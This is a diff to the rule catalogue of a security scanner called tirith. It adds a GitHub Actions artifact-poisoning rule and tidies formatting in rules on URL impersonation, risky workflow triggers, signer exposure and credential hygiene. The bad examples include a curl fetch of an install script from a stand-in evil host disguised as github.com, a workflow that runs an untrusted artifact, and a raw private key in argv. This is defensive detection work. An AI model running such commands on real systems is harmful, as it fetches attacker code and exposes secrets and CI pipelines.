@@ -51,7 +51,7 @@ id = "userinfo_trick"
 title = "Userinfo domain impersonation"
 category = "hostname"
 severity_rationale = "High — the URL userinfo field (before @) can make a malicious URL appear to point to a trusted domain."
-description = "The URL contains a userinfo component with a dot (e.g., http://legit.com@evil.com/). Browsers and tools resolve the actual host from after the @, but users see the fake domain first."
+description = "The URL contains a userinfo component with a dot (for example `legit.com@evil.com`). Browsers and tools resolve the actual host from after the @, but users see the fake domain first."
 examples_bad = ["curl http://github.com@evil.example.com/install.sh"]
 examples_good = ["curl https://github.com/install.sh"]
 false_positive_guidance = "Some URLs legitimately use userinfo for authentication (e.g., FTP). These typically do not contain dots in the userinfo."
@@ -1009,7 +1009,7 @@ mitre_id = "T1195.001"
 id = "workflow_dangerous_trigger"
 title = "Workflow uses the pull_request_target trigger"
 category = "ecosystem"
-severity_rationale = "High — pull_request_target runs with a read/write GITHUB_TOKEN and repository secrets in the context of an untrusted fork's pull request; combined with a checkout of PR code it is a known secret-exfiltration vector."
+severity_rationale = "High — pull_request_target runs with a read/write `GITHUB_TOKEN` and repository secrets in the context of an untrusted fork's pull request; combined with a checkout of PR code it is a known secret-exfiltration vector."
 description = "A GitHub Actions workflow is triggered by `pull_request_target`. Unlike `pull_request`, this trigger grants the workflow repository secrets and a privileged token even for pull requests from forks."
 examples_bad = ["on:\n  pull_request_target:"]
 examples_good = ["on:\n  pull_request:"]
@@ -1043,9 +1043,9 @@ mitre_id = "T1195.001"
 
 [[rule]]
 id = "workflow_excessive_permissions"
-title = "Workflow grants an excessive GITHUB_TOKEN for a risky trigger"
+title = "Workflow grants an excessive `GITHUB_TOKEN` for a risky trigger"
 category = "ecosystem"
-severity_rationale = "Medium: a workflow reachable from an untrusted actor (a fork pull_request_target, a workflow_run, or an issue/comment event) that runs with a broad GITHUB_TOKEN lets any compromised step push to the repo, publish packages, or alter releases with the repository's credentials."
+severity_rationale = "Medium: a workflow reachable from an untrusted actor (a fork pull_request_target, a workflow_run, or an issue/comment event) that runs with a broad `GITHUB_TOKEN` lets any compromised step push to the repo, publish packages, or alter releases with the repository's credentials."
 description = "The workflow is triggered by an event an untrusted actor can influence and either grants an over-broad token (`permissions: write-all`, or `contents: write`) or sets no `permissions:` block at all so the broad default token is in effect. Job-level `permissions:` are honored: a job that constrains its own token is not flagged even when the workflow top-level is unset."
 examples_bad = ["on: pull_request_target\npermissions: write-all", "on:\n  issue_comment:\njobs:\n  a:\n    steps: [...]"]
 examples_good = ["on: pull_request_target\npermissions:\n  contents: read", "on:\n  issue_comment:\njobs:\n  a:\n    permissions:\n      contents: read"]
@@ -1087,6 +1087,18 @@ examples_bad = ["uses: actions/cache@<sha>\nwith:\n  key: deps-${{ github.head_r
 examples_good = ["uses: actions/cache@<sha>\nwith:\n  key: deps-${{ runner.os }}-${{ hashFiles('**/lockfile') }}"]
 false_positive_guidance = "A key built only from trusted, content-derived values (`hashFiles(...)`, `runner.os`, `github.sha`) is safe and does not fire. Only the known attacker-controllable contexts are treated as untrusted."
 remediation = "Build cache keys only from trusted, content-derived values such as `hashFiles(...)` and the runner OS; never from untrusted event data like a PR title or branch name."
+mitre_id = "T1195.001"
+
+[[rule]]
+id = "workflow_artifact_poisoning"
+title = "Privileged workflow consumes a build artifact produced by an untrusted run"
+category = "ecosystem"
+severity_rationale = "High: the full chain is proven, not inferred. A fork/PR-reachable workflow uploads an artifact, a `workflow_run` workflow running on the default branch with a read/write `GITHUB_TOKEN` and secrets downloads that same artifact from the run that triggered it, and a later step in the same job executes, sources, PATH-mutates, publishes, or deploys it with no trusted digest or attestation compared in between. An untrusted contributor therefore decides the bytes a privileged job runs or ships without ever editing the privileged workflow."
+description = "This is the build-output trust break. The attacker never touches the privileged workflow's text; they change only the artifact it consumes. Tirith proves the chain across workflow files during a repository scan: an untrusted producer, an upload under a statically resolved artifact name, a cross-run download bound to `github.event.workflow_run.id` in this repository, a matching artifact identity, and a dangerous sink after the download."
+examples_bad = ["ci.yml: on: pull_request + actions/upload-artifact (name: build)\ndeploy.yml: on: workflow_run + actions/download-artifact@v4 (name: build, run-id: ${{ github.event.workflow_run.id }}) then `bash ./dist/install.sh`"]
+examples_good = ["deploy.yml: download the artifact, then `gh attestation verify` (or compare it against a checksum file that lives OUTSIDE the download directory) before any execute/publish/deploy step"]
+false_positive_guidance = "Only a fully proven chain fires. A producer whose only triggers are push/schedule/workflow_dispatch is not fork-reachable and never participates. actions/download-artifact v3 and earlier cannot fetch across runs and are ignored. A download with no dangerous sink (a report or coverage file that is only read) is not flagged. An execute, source, or PATH-mutation sink must additionally name an operand inside the download directory; a publish or deploy sink is matched on step order within the same job instead, because those ship the workspace as a whole. Anything statically unresolvable - an expression or glob in an artifact name, a wildcard or missing `on.workflow_run.workflows` list, a reusable workflow, a local composite action, a matrix job, an unresolvable step shell, or an exhausted scan bound - is treated as incomplete coverage and blocks the finding rather than producing a guess. Because this finding is assembled by the repository scan driver rather than by `engine::analyze`, the policy allowlist does not apply to it; use `severity_overrides` or `action_overrides` on `workflow_artifact_poisoning` instead."
+remediation = "Do not treat the triggering run's artifact as trusted input. Verify it against a digest or attestation that the producer run cannot supply (a checksum file committed outside the download directory, `gh attestation verify`, or a signature) BEFORE executing, sourcing, PATH-adding, publishing, or deploying it. Better still, do the privileged work in a run that builds from a trusted ref rather than consuming a fork-influenced build output."
 mitre_id = "T1195.001"
 
 [[rule]]
@@ -1802,7 +1814,7 @@ mitre_id = "T1565"
 id = "web3_signer_risk"
 title = "Risky signer material or signer exposure"
 category = "ecosystem"
-severity_rationale = "Critical when literal raw signer material appears in the command, because a private key or mnemonic in argv is readable from the process table, the shell history, and any log that captures the command, so the key must be treated as compromised the moment it is typed. High for a password, a passphrase, or an unlocked production node, where the exposure is real but indirect. Lower for a symbolic reference to a non-production signer, which names a key without revealing it."
+severity_rationale = "Critical when literal raw signer material appears in the command, because a `private key` or `mnemonic` in argv is readable from the process table, the shell history, and any log that captures the command, so the key must be treated as compromised the moment it is typed. High for a password, a passphrase, or an unlocked production node, where the exposure is real but indirect. Lower for a symbolic reference to a non-production signer, which names a key without revealing it."
 description = "Reports HOW the command supplies its signer. Evidence names the signer kind and never the key, the keystore path, or the address. A hardware wallet or a keystore reference is the expected shape; a raw key pasted into the command line is not."
 examples_bad = ["cast send 0xabc --private-key 0x<64 hex>", "forge script Deploy.s.sol --broadcast --mnemonic '<twelve words>'", "cast send 0xabc --unlocked --from 0xdeadbeef"]
 examples_good = ["cast send 0xabc --ledger", "cast send 0xabc --keystore ~/.ethereum/keystore/UTC--...", "forge script Deploy.s.sol --broadcast --account deployer"]
@@ -1853,7 +1865,7 @@ id = "context_prod_credential_change"
 title = "IAM / credential change against production context"
 category = "context"
 severity_rationale = "High — IAM mutations against a production context (access key create/delete, service-account key create, role binding create/delete) are routinely irreversible or audit-noisy when undone. Production credential mutations should go through change management, not an interactive shell."
-description = "The active provider context is labeled `critical` or `production` and the command mutates IAM / RBAC / access-key state."
+description = "The active provider context is labeled `critical` or `production` and the command mutates IAM / RBAC / `access-key` state."
 examples_bad = ["aws iam create-access-key --user-name svc-payments", "gcloud iam service-accounts keys create key.json --iam-account=svc@proj.iam.gserviceaccount.com", "az ad sp delete --id <id>", "kubectl create clusterrolebinding admin --clusterrole=cluster-admin --user=alice"]
 examples_good = ["aws iam list-access-keys", "gcloud iam service-accounts list", "kubectl get clusterrolebindings"]
 false_positive_guidance = "Read-only IAM commands (list/get/show) never fire. If your workflow requires interactive IAM mutations on a labeled-prod context, demote via `severity_overrides` for the specific rule on a CI runner, or re-label the context with `tirith context label`."
@@ -2088,7 +2100,7 @@ mitre_id = "T1552.001"
 
 [[rule]]
 id = "hygiene_kubeconfig_group_readable"
-title = "kubeconfig is group- or other-accessible"
+title = "`kubeconfig` is group- or other-accessible"
 category = "hygiene"
 severity_rationale = "Medium — `~/.kube/config` embeds cluster credentials (client certs, bearer tokens). Group/other access leaks them to co-tenants on a shared host. Medium (not High) because the common distro default is 0644 and the threat is local-multiuser."
 description = "`~/.kube/config` has permission bits granting group or other any access (`mode & 0o077 != 0`)."
@@ -2112,13 +2124,13 @@ mitre_id = "T1552.001"
 
 [[rule]]
 id = "hygiene_pypirc_plaintext_token"
-title = ".pypirc carries a plaintext password or API token"
+title = ".pypirc carries a plaintext `password` or API token"
 category = "hygiene"
 severity_rationale = "High — a literal `password` or `pypi-…` upload token in `~/.pypirc` is a PyPI publish credential in cleartext."
 description = "`~/.pypirc` contains a `password` assignment with a literal value, or a literal `pypi-…` API token in a value position."
 examples_bad = ["password = pypi-AgEIcHlwaS5vcmc..."]
 examples_good = ["username = __token__  # with the token supplied via keyring or ${TWINE_PASSWORD}"]
-false_positive_guidance = "A bare `username = __token__` with no literal password is the keyring/env-indirection pattern and is not flagged."
+false_positive_guidance = "A bare `username = __token__` with no literal `password` is the keyring/env-indirection pattern and is not flagged."
 remediation = "Use a keyring-backed credential or a `${TWINE_PASSWORD}` env reference and rotate the exposed token. tirith does NOT edit the file — this is a manual fix."
 mitre_id = "T1552.001"
 
@@ -2174,7 +2186,7 @@ mitre_id = "T1552.001"
 id = "hygiene_db_dump_in_repo"
 title = "Database dump present in the repository"
 category = "hygiene"
-severity_rationale = "Medium — `*.dump` / `*.sql` files committed (or sitting) in a repo frequently contain production PII, password hashes, or embedded credentials, and are easy to leak via a push or an archive."
+severity_rationale = "Medium — `*.dump` / `*.sql` files committed (or sitting) in a repo frequently contain production PII, `password` hashes, or embedded credentials, and are easy to leak via a push or an archive."
 description = "A `*.dump` or `*.sql` file exists in the repo tree (the walk skips `.git`, `node_modules`, `target`, `vendor`, and dot-directories)."
 examples_bad = ["backup.sql in the repo root", "snapshot.dump committed to the repo"]
 examples_good = ["schema migration .sql files under db/migrations/  # structure only, no data — review and allowlist if intended"]
